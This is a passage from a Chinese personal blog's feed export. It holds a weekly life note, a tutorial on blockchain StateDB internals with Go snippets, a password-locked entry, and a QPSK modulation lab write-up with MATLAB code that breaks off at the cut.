id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><ol><li>伍六七第三季最后一集！《你是我想保护的人》，梅小姐这次选择拼尽全力保护阿柒，爱了爱了！而阿柒，用魔刀千刃给梅小姐的剑“续命”，真爱无疑！然而，剧情戛然而止了，挖了一堆坑，注意，是一堆坑！还要出大电影，还真就从一个爆款 IP 上面疯狂捞金呗。</li></ol><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><blockquote><p>来自知乎：<strong>当代社会中，青年的五四精神会有哪些具体表现？</strong></p></blockquote><ul><li>第一点就是<strong>爱国</strong>，这一条都做不到也无从谈起。任何时候，爱国都是第一位，也是不能撼动的。</li><li>第二点就是<strong>敬业</strong>，做好本职工作，脚踏实地的工作，认认真真的工作，不要得陇望蜀，好高骛远。</li><li>第三点就是<strong>明志</strong>，志即志向或者理想，一个人要有自己的目标，不能得过且过，当一天和尚撞一天钟。作为青年，需要有自己的人生规划。</li><li>第四点就是<strong>静心</strong>，国家发展越来越快，社会节奏越来越快，快节奏的生活让人一夜暴富，一夜成名，这让许多人都变得越来越浮躁，内心静不下来，空中楼阁的繁华富贵让许多人迷失了自我。</li></ul><blockquote><p>这是从一篇 coolhash 测压的文章中看到的，作者说：“是存在差距，但是可以站着学习，而不是跪着膜拜，一味跟从只会丧失判断力和创新力，香港的年轻人曾经不相信大陆的 taobao 会比 eBay 强大，QQ 会比 MSN 强大，直到 MSN 垮了仍然不相信是真的，没有信心，没有努力，梦想只会变成做梦。”</p></blockquote><p>曾国藩：窃喜洋人之智巧，我中国人亦能为之，彼不能傲我以其所不知矣!</p><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><ol><li>如何对区块链系统测试。</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>又是一年青年节，在互联网多元文化的滋润下成长起来的新生代，给这个时代带来了新的课题，你不想成为一个什么样的人？</li></ol><p>我们总说，“君子有所为，有所不为”。年轻人何尝不是如此？<strong>那些非凡的勇气、思辨的精神、激扬的斗志，极尽人们对青春年华的无限想象；那些意志的消磨、生活的妥协、人生的沉沦，也在提醒人们对未老先衰的潜在担忧。</strong>从这个意义上来说，我们礼赞青年，不只是为了体现对青春年少的呵护，更是为了帮助青年扫除心灵的阴霾；我们歌颂青春，不只是为了了却人生苦短的遗憾，更是为了诠释时光荏苒的意义。要知道，青年人最大的资本，恰恰是最容易被自己忽视的青春；青春最值得的回忆，正是追逐梦想、成长奋斗的痕迹。<br>诗人塞缪尔·厄尔曼在《青春》中这样写道：“人人心中皆有一台天线，只要还能接受美好、希望、欢乐、勇气和力量的信号，就能青春永驻，风华常存。”<strong>架起这台心灵的“天线”，去感受日月星辰，去明辨是非曲直，去体悟人生百态，每一个成长的灵魂，就一定都能找到“你想成为怎样的人”和“我不想做这样的人”的完美答案。</strong><br><img src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-3-to-10-1.jpeg#clientId=ud5d56b56-b62c-4&from=paste&height=505&id=u6ef2f665&margin=%5Bobject%20Object%5D&originHeight=1009&originWidth=679&originalType=url&status=done&style=none&taskId=ub78ac62c-0766-4032-984a-851d51f1c7e&width=339.5"></p>]]></content>
    
    
    <categories>
      
      <category>周报</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>区块链底层-状态机StateDB</title>
    <link href="/2021/05/03/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E7%8A%B6%E6%80%81%E6%9C%BAStateDB_new/"/>
    <url>/2021/05/03/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E7%8A%B6%E6%80%81%E6%9C%BAStateDB_new/</url>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="全局"><a href="#全局" class="headerlink" title="全局"></a>全局</h1><p><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E7%8A%B6%E6%80%81%E6%9C%BAStateDB-1.png#clientId=u1d1d90de-5c3e-4&from=paste&height=344&id=ub777611d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=688&originWidth=1306&originalType=binary&size=308117&status=done&style=none&taskId=u950bfa17-cd9c-4cde-b1d9-eb903342901&width=653" alt="image.png"><br><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E7%8A%B6%E6%80%81%E6%9C%BAStateDB-2.png#clientId=u1d1d90de-5c3e-4&from=paste&height=200&id=u4a6a08ef&margin=%5Bobject%20Object%5D&name=image.png&originHeight=399&originWidth=969&originalType=binary&size=146076&status=done&style=none&taskId=ude525437-624d-4812-952f-2b51a1576ff&width=484.5" alt="image.png"></p><h1 id="创建状态树"><a href="#创建状态树" class="headerlink" title="创建状态树"></a>创建状态树</h1><p>状态数据库的定义如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> StateDB <span class="hljs-keyword">struct</span> &#123;<br>db   Database  <span class="hljs-comment">//操作状态的底层数据库，在实例化 StateDB 时指定 ②。</span><br>trie trie.Trie <span class="hljs-comment">//世界状态所在的树实例对象</span><br>stateObjects      <span class="hljs-keyword">map</span>[account.Address]*account.StateObject <span class="hljs-comment">//已账户地址为键的账户状态对象，能够在内存中维护使用过的账户</span><br>stateObjectsDirty <span class="hljs-keyword">map</span>[account.Address]<span class="hljs-keyword">struct</span>&#123;&#125;<span class="hljs-comment">//标记被修改过的账户</span><br>    dbErr  error<br>lock sync.Mutex<br>&#125;<br></code></pre></td></tr></table></figure><p>首先，</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">db: = state.NewDatabase(levelDB)<br>statedb, err := state.New(block.Root(), db)<br></code></pre></td></tr></table></figure><p>这里的 New 函数为：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//state/statedb.go:27</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">New</span><span class="hljs-params">(root hash.Hash, db Database)</span> <span class="hljs-params">(*StateDB, error)</span></span> &#123;<br>tr, err := db.OpenTrie(root)<span class="hljs-comment">//打开指定状态版本(root)的含世界状态的顶层树</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> &amp;StateDB&#123;<br>db:                db,<span class="hljs-comment">//②</span><br>trie:              tr,<br>stateObjects:      <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[account.Address]*stateObject),<br>        stateObjectsDirty: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[account.Address]<span class="hljs-keyword">struct</span>&#123;&#125;),<br>preimages:         <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[hash.Hash][]<span class="hljs-keyword">byte</span>),<br>journal:           newJournal(),<br>&#125;, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>世界态中的所有状态都是已账户为基础单位存在的，因此为了便于账户隔离管理，使用不开放的 stateObject 来维护某个账户下的状态。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> StateObject <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">//账户哈希</span><br>addrHash <span class="hljs-keyword">string</span><br>data     User <span class="hljs-comment">//账户属性</span><br><span class="hljs-comment">//底层数据库</span><br>db *state.StateDB<br><span class="hljs-comment">// 写缓存</span><br>trie Trie <span class="hljs-comment">// 存储树，第一次访问时初始化</span><br>&#125;<br><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">//账户地址</span><br>Address []<span class="hljs-keyword">byte</span><br><span class="hljs-comment">//账户余额</span><br>Amount <span class="hljs-keyword">float64</span><br><span class="hljs-comment">//交易个数</span><br>Nonce <span class="hljs-keyword">uint64</span><br><span class="hljs-comment">//storage树根哈希值</span><br>Root <span class="hljs-keyword">string</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到 stateObject 中维护关于某个账户的所有信息，涉及账户地址、账户地址哈希、底层数据库、存储树等内容。<br>在区块中，将交易作为输入条件，来根据一系列动作修改状态。 在完成区块挖矿前，只是获得在内存中的状态树的 Root 值。 StateDB 可视为一个内存数据库，状态数据先在内存数据库中完成修改，所有关于状态的计算都在内存中完成。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//将每个交易对应的的账户状态树进行修改</span><br>usr := getUserByAddress(t.Address)<br><span class="hljs-keyword">if</span> usr.Amount - t.Fee &lt;<span class="hljs-number">0</span> &#123;<br>    <span class="hljs-keyword">return</span> err<br>&#125;<br>usr.Nonce = usr.Nonce + <span class="hljs-number">1</span><br>uMPT := getMPT(usr.Root)<br>data := *(*[]<span class="hljs-keyword">byte</span>)(unsafe.Pointer(&amp;t))<br>uMPT.Put([]<span class="hljs-keyword">byte</span>(t.Hash),data)<br>usr.Root := uMPT.RootHash()<br></code></pre></td></tr></table></figure><p>在将区块持久化时完成有内存到数据库的更新存储，此更新属于增量更新，仅仅修改涉及到被修改部分。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// state/statedb.go:122</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *StateDB)</span> <span class="hljs-title">Commit</span><span class="hljs-params">(deleteEmptyObjects <span class="hljs-keyword">bool</span>)</span> <span class="hljs-params">(root hash.Hash, err error)</span></span> &#123;<br><span class="hljs-keyword">for</span> addr := <span class="hljs-keyword">range</span> s.journal.dirties &#123;<span class="hljs-comment">//①⑧⑨⑩</span><br>s.stateObjectsDirty[addr] = <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;<br>&#125;<br><span class="hljs-keyword">for</span> addr, stateObject := <span class="hljs-keyword">range</span> s.stateObjects &#123;<span class="hljs-comment">//②</span><br>_, isDirty := s.stateObjectsDirty[addr]<br><br>        <span class="hljs-keyword">if</span> isDirty&#123;<br><span class="hljs-comment">//如果集合中的账户有变更</span><br><span class="hljs-keyword">if</span> err := stateObject.CommitTrie(s.db); err != <span class="hljs-literal">nil</span> &#123;<span class="hljs-comment">//⑤</span><br><span class="hljs-keyword">return</span> common.Hash&#123;&#125;, err<br>&#125;<br>s.updateStateObject(stateObject)<span class="hljs-comment">//需要提交此账户</span><br>  &#125;<br><span class="hljs-built_in">delete</span>(s.stateObjectsDirty, addr)<br>    &#125;<br>    &#125;<br><span class="hljs-comment">//...</span><br>root, err = s.trie.Commit(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(leaf []<span class="hljs-keyword">byte</span>, parent hash.Hash)</span> <span class="hljs-title">error</span></span> &#123;<span class="hljs-comment">//⑦</span><br><span class="hljs-keyword">var</span> account Account<br><span class="hljs-keyword">if</span> err := rlp.DecodeBytes(leaf, &amp;account); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">if</span> account.Root != emptyRoot &#123;<br>s.db.TrieDB().Reference(account.Root, parent)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;)<br><span class="hljs-keyword">return</span> root, err<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>因为在修改某账户信息是，将会记录变更流水（journal），因此在提交保存修改时只需要将在流水中存在的记录作为修改集 ①。</li><li>所有访问过的账户信息，均被记录在 stateObjects 中，只需要遍历此集合 ② 便可以提交所有修改。</li><li>处理完每个需要提交的账户内容外，最后需要将账户树提交 ⑦。在提交过程中涉及账户内容作为叶子节点，在发送变动时，将更新账户节点和父节点的关系。</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>生活周报-April-26-to-May-2</title>
    <link href="/2021/05/01/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-April-26-to-May-2_new/"/>
    <url>/2021/05/01/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-April-26-to-May-2_new/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="7d1e173d467e0f96dfae2d0bdf42c7bf59874ff1804e710964683a03bf6578dd"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>周报</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活周报</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>QPSK信号调制</title>
    <link href="/2021/04/27/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6_new/"/>
    <url>/2021/04/27/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6_new/</url>
    
    <content type="html"><![CDATA[<p>b 测题目，由于学长写的代码有些步骤无法理解，而且代码不优雅，故重写之。</p><a id="more"></a><h1 id="题目要求"><a href="#题目要求" class="headerlink" title="题目要求"></a>题目要求</h1><ol><li>源码信号为周期 63bits 的 m 序列， 源码比特速率（kbps） 数值上= 载波频率（kHz），数值范围 5—100，在数值范围内任取整数；</li><li>在 MATLAB 环境中编写 M 代码搭建 QPSK 调制系统模型；</li><li>观测基带时域波形、已调信号时域波形；</li><li>观测基带发射星座图；</li><li>观测已调信号的功率谱（优先）或频谱；</li></ol><h1 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h1><h2 id="比特率"><a href="#比特率" class="headerlink" title="比特率"></a>比特率</h2><p>比特率(bit rate)又称传信率、信息传输速率(简称信息速率，information rate)。其定义是：<strong>通信线路(或系统)单位时间(每秒)内传输的信息量，即每秒能传输的二进制位</strong>数，通常用 Rb 表示，其单位是比特/秒(bit/s 或 b/s，英文缩略语为 bps)。　　<br>在二进制系统中，信息速率(比特率)与信号速率(波特率)相等，例如，当系统以每秒 50 个二进制符号传输时，信息速率为 50bit/s，信号速率也为 50Bd(波特)。在无调制的情况下，比特率等于波特率；采用调相技术时，比特率不等于波特率。通信系统的发送设备和接收设备必须在相同的波特率下工作，否则会出现帧同步错误。</p><h2 id="波特率"><a href="#波特率" class="headerlink" title="波特率"></a>波特率</h2><p>波特率(Baud rate)又称传码率、码元传输速率(简称码元速率)、信号传输速率(简称信号速率，signaling rate)或调制速率。其定义是：<strong>通信线路(或系统)单位时间(每秒)内传输的码元(脉冲)个数</strong>；或者表示信号调制过程中，单位时间内调制信号波形的变换次数，通常用 RB 表示，单位是波特(Bd 或 Baud，前者规范)。如果每秒传输 1 个码元就称为 1Bd；如果 1 码元的时间长短为 200ms，则每秒可传输 5 个码元，那么码元速率(波特率)就是 5Bd。　　<br>波特率(码元速率)并没有限定是何种进制的码元，所以给出波特率时必须说明这个码元的进制。对于 M 进制码元，比特率(信息速率)Rb 与波特率(码元速率)RB 的关系式为　　<br>Rb=RB·lbM 　　<br>式中：lbM=log2M，表示 M 的以 2 为底的对数。显然，对于二进制码元，由于 lb2=1，所以 Rb=RB，即波特率与比特率在数值上相等，但单位不同，也即二者代表的意义不同。　　<br>例如，波特率为 600Bd，则在二进制时，比特率也为 600bit/s；在四进制时，由于 lb4=2，所以比特率为 1200bit/s。可见，在一个码元中可以传送多个比特。</p><h2 id="数据传输率"><a href="#数据传输率" class="headerlink" title="数据传输率"></a>数据传输率</h2><p>数据传输率(data transfer rate)又称数据传输速率、数据传送率。其定义是：<strong>通信线路(或系统)单位时间(每秒)内传输的字符个数</strong>；或者单位时间(每秒)内传输的码组(字块)数或比特数。其单位是字符/秒；或者码组/秒、比特/秒(可见，当数据传输率用“bit/s”作单位时，即等于比特率)。 <strong>所以它的单位在不同的应用中是不同的。</strong>　<br>　例如，在某计算机异步串行通信系统中，数据传输率为 960 字符/s，每个字符包括 1 个起始位、8 个数据位、1 个停止位，则对应的比特率为 10×960 位/s=9600 位/s=9600bit/s；因为是二进制编码，所以对应的波特率也为 9600Bd。<strong>可见，在我们平时用的串口通信中，波特率是 9600Bd，其实比特率也是 9600bps，因为默认就是 2 进制，波特率和比特率就是 M 进制的差别。</strong></p><h2 id="采样频率-fs"><a href="#采样频率-fs" class="headerlink" title="采样频率 fs"></a>采样频率 fs</h2><p>定义：<strong>每秒从连续信号中提取并组成离散信号的采样个数。</strong><br>采样次数 Ns，每个码元被采样的次数，必须为 2 的幂。<br>fs=fb*Ns<br>其中 fb 为波特率，每秒能传输的二进制位数。</p><blockquote><p>实际中，要处理的为模拟信号，想要在数字系统中处理必须为数字信号，即采用抽样、量化、编码的处理方案。<br>处理的第一步为<strong>抽样</strong>，即模数转换。以电话为例，每秒 3000 次取样，每个取样是 7 比特，那么电话的比特率是 21000。而 CD 是每秒 44100 次取样，两个声道，每个取样是 13 位 PCM 编码，所以 CD 的比特率是 44100_2_13=1146600，这个参数也被称为数据带宽，它和 ADSL 中的带宽是一个概念。将码率除以 8,就可以得到这个它的数据速率，1146600/8=143325，也就是说 CD 每秒的数据量大约是 144KB，而一张 CD 的容量是 74 分等于 4440 秒，就是 639360KB ＝ 640MB。即刚好为一张 cd 的容量。</p></blockquote><h2 id="快速傅里叶变换-FFT"><a href="#快速傅里叶变换-FFT" class="headerlink" title="快速傅里叶变换 FFT"></a>快速傅里叶变换 FFT</h2><p>做 n 个点的 FFT，表示在时域上对原来的信号取了 n 个点来做频谱分析，n 点 FFT 变换的结果仍为 n 个点。<br>换句话说，就是将 2pi 数字频率 w 分成 n 份，而整个数字频率 w 的范围覆盖了从 0-2pi*fs 的模拟频率范围。这里的 fs 是<strong>采样频率</strong>。根据<strong>奈科斯特定律</strong>，只有 f=fs/2 范围内的信号才是被采样到的有效信号。<br>举例说，如果做了 16 个点的 FFT 分析，你原来的模拟信号的最高频率 f=32kHz，采样频率是 64kHz，n 的范围是 0,1,2…15。（注：这意味着已经将原来的模拟信号采样了 8 遍。）这时，64kHz 的模拟频率被分成了 16 分，每一份是 4kHz，这个叫<strong>频率分辨率</strong>（卢注：做 FFT 用的点越多，频率分辨率越高）。那么在横坐标中，n=1 时对应的 f 是 4kHz, n=2 对应的是 8kHz, n=15 时对应的是 60kHz，你的频谱是关于 n=8 对称的。你只需要关心 n=0 到 7 以内的频谱就足够了，因为，原来信号的最高模拟频率是 32kHz。<br><a href="https://blog.csdn.net/weixin_39591031/article/details/110392352">https://blog.csdn.net/weixin_39591031/article/details/110392352</a></p><h2 id="QPSK"><a href="#QPSK" class="headerlink" title="QPSK"></a>QPSK</h2><p>QPSK 又叫<strong>四相绝对相移调制（4PSK）</strong>，QPSK 利用载波的四种不同相位来表征数字信息。它的频带利用率高，是 BPSK(二相相移键控）的 2 倍。当数据码元速率相同时，QPSK 信号的传输波特率为 BPSK 信号的传输波特率的一半，所以 QPSK 的传输带宽是 BPSK 信号的一半。QPSK 调制技术的抗干扰能力强，采用相干检测时其误码性能与 BPSK 相同，故得到广泛应用。<br><img src="https://image.hackerjerry.top/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6-1.png#clientId=u6d886849-8a59-4&from=paste&height=86&id=u40231118&margin=%5Bobject%20Object%5D&name=image.png&originHeight=172&originWidth=922&originalType=binary&size=45922&status=done&style=none&taskId=u80ca2014-1869-4d49-b7f8-d1456c86125&width=461" alt="image.png"><br>写成正交形式：<br><img src="https://image.hackerjerry.top/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6-2.png#clientId=u6d886849-8a59-4&from=paste&height=149&id=u0c5731d0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=297&originWidth=1117&originalType=binary&size=83630&status=done&style=none&taskId=u3fd5ace3-945e-4eac-bc13-dac014e29e4&width=558.5" alt="image.png"><br>QPSK 调制是利用载波的 4 种不同相位来表征数字信息。每一种载波相位代表两个比特的信息。例如，若输入二进制数字信息，序列为 10011100，…，则应该先将其进行分组，每两个比特编为一组。可将它们分为 10，01，11，00 等，然后分别用四种不同的相位来表示。故每个四进制码元又称为双比特码元。把组成双比特码元的前一个信息比特用 a 表示，后一个信息比特用 b 表示。双比特码元中两个信息比特 ab 与载波相位的矢量关系如图 1 所示。图（a）表示 A 方式时 QPSK 信号矢量图，图（b）表示 B 方式时 QPSK 信号的矢量图。由于正弦和余弦的互补特性，对于载波相位的四种取值，在 A 方式中：0°、90°、180°、270°，则数据通过处理后输岀的成形波形幅度有三种取值；B 方式中：45°、135°、225°、315°，则数据通过处理后输出的成形波形幅度有两种取值。<br><img src="https://image.hackerjerry.top/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6-3.png#clientId=u6d886849-8a59-4&from=paste&height=115&id=u633a436c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=230&originWidth=750&originalType=binary&size=26531&status=done&style=none&taskId=u44ca49f7-2450-4bb0-841f-6fa8556732d&width=375" alt="image.png"><br><img src="https://image.hackerjerry.top/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6-4.png#clientId=u6d886849-8a59-4&from=paste&height=185&id=uce77a3fe&margin=%5Bobject%20Object%5D&name=image.png&originHeight=185&originWidth=446&originalType=binary&size=14966&status=done&style=none&taskId=u3c682ff6-2ff7-415e-b46c-5a165526cd4&width=446" alt="image.png"><br>在本次实验中我们采取 B 方式进行调制。<br><img src="https://image.hackerjerry.top/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6-5.png#clientId=u6d886849-8a59-4&from=paste&height=242&id=ucdfabb2a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=284&originWidth=676&originalType=binary&size=17711&status=done&style=none&taskId=u40e11ebc-b2ee-4601-b62f-71e844d08ee&width=576" alt="image.png"><br>原理图如上。<br><img src="https://image.hackerjerry.top/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6-6.png#clientId=u6d886849-8a59-4&from=paste&height=185&id=u45ba068d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=370&originWidth=835&originalType=binary&size=66431&status=done&style=none&taskId=u3a4a4871-452c-400d-847a-470c345f1da&width=417.5" alt="image.png"></p><h2 id="QPSK-的功率谱"><a href="#QPSK-的功率谱" class="headerlink" title="QPSK 的功率谱"></a>QPSK 的功率谱</h2><p>由于 QPSK 信号可被理解为由同相支路和正交支路两路 2PSK 叠加而成，但是载波的幅度与码元速率不同，因此 QPSK 信号的功率谱密度相当于 2PSK 信号的功率谱密度的线性叠加：<br><img src="https://image.hackerjerry.top/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6-7.png#clientId=u6d886849-8a59-4&from=paste&height=49&id=u60898145&margin=%5Bobject%20Object%5D&name=image.png&originHeight=98&originWidth=663&originalType=binary&size=21889&status=done&style=none&taskId=u7f7c99c7-14ab-4639-a548-05a3d1a2b02&width=331.5" alt="image.png"><br>因此 QPSK 信号的功率谱示意图如下：<br><img src="https://image.hackerjerry.top/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6-8.png#clientId=u6d886849-8a59-4&from=paste&height=147&id=u8a6de52d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=294&originWidth=737&originalType=binary&size=35568&status=done&style=none&taskId=u57056394-5a0d-4c56-a71b-f833cbdb882&width=368.5" alt="image.png"><br>由上图可以看出其带宽等于基带码元速率，峰值频率为等于载波频率。</p><h2 id="星座图的基本概念"><a href="#星座图的基本概念" class="headerlink" title="星座图的基本概念"></a>星座图的基本概念</h2><p>在数字通信领域中，经常将数字信号在复平面上表示，以直观的表示信号以及信号之间的关系，这种图示就是星座图。星座图可以看成数字信号的一个“二维眼图”阵列，同时符号在图中所处的位置具有合理的限制或判决边界。如果要将数字信号发送出去，一般不会直接发 0 或 1，而是先将 0,1 信号（bit）按照一个或者几个组成一组，比如每两个 bit 组成一组，即有 00,01,10,11，总共四种状态，此时可以选择 QPSK 调制，QPSK 四个点组成一个 QPSK 的星座图，每个点与相邻的点相差 90 度（幅度是相同的），一个星座点对应一个调制符号。星座图的作用主要是在调制时用于映射，而接收时用于判断发送的到底是哪个点，从而正确解调数据。</p><h1 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h1><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs matlab">clear all;clc;<br><span class="hljs-comment">%% 生成伪随机码</span><br><br>len = <span class="hljs-number">64</span>;<br><br>orderNum = <span class="hljs-number">6</span>;<span class="hljs-comment">%m序列为6阶</span><br><br>xulie = idinput((<span class="hljs-number">2</span>^orderNum<span 